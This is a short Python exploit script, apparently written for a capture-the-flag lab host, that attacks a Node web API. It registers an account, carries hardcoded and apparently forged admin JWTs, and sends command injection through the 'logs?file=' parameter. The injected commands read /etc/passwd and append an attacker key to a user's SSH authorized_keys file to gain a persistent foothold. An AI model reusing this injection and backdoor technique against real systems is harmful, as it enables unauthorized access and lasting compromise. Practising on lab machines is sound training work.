#!/usr/bin/python3

from pprint import pprint
import requests

BASE_URL = "http://10.10.11.120:3000/api/"


def register():

    sess = requests.session()
    url = BASE_URL+"user/register"
    data = {
        "name": "payload",
	"email": "payload@payload.com",
	"password": "123456"
    }

    response = sess.post(url=url, json=data)

    print(response.text)


def login():

    url = BASE_URL+"user/login"
    data = {
        "email": "payload@payload.com",
	"password": "123456"
    }
    token = requests.post(url=url, json=data)
    
    auth_url = BASE_URL+"priv"
    
    # pprint(token.headers)
    # pprint(token.cookies.get_dict())
    print("token: ", token.text)

    # headers = {
    # "auth-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjEyODRhOTRkZWMzYzA0NDhmNzFlOTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1hc3IxOTc1dEBob3RtYWlsLmNvbSIsImlhdCI6MTY0NTM4NTM1MX0.r7b2WXw1gdLKXyjIth5B80k7QsXfvR_yfVoXiQkp8_A" # "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE" # "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
    # }
    # # data = {"name":"theadmin"}
    # res = requests.get(url=BASE_URL+"logs?file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys", headers=headers)
    # # print(res.url)
    # print(res.text)


def get_logs(url):

    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjEyYWQ2MjRkZWMzYzA0NDhmNzFlYmQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBheWxvYWRAcGF5bG9hZC5jb20iLCJpYXQiOjE2NDUzOTEyMDN9.jN9Ob3aJ2LnpwEk0LkF2zOzqxS14jbRTPPxCioByGhs"

    headers = {
        "auth-token":f"{token}"
    }

    # res = requests.get(url=url+"logs?file=index.js;id; cat+/etc/passwd", headers=headers)
    res = requests.get(url=url+"logs?file=index.js;mkdir -p /home/dasith/.ssh; echo $KEY >> /home/dasith/.ssh/authorized_keys", headers=headers)
    print(res.text)


def main():
    # register()
    # login()
    get_logs("http://10.10.11.120:3000/api/")



if __name__ == "__main__":
    main()
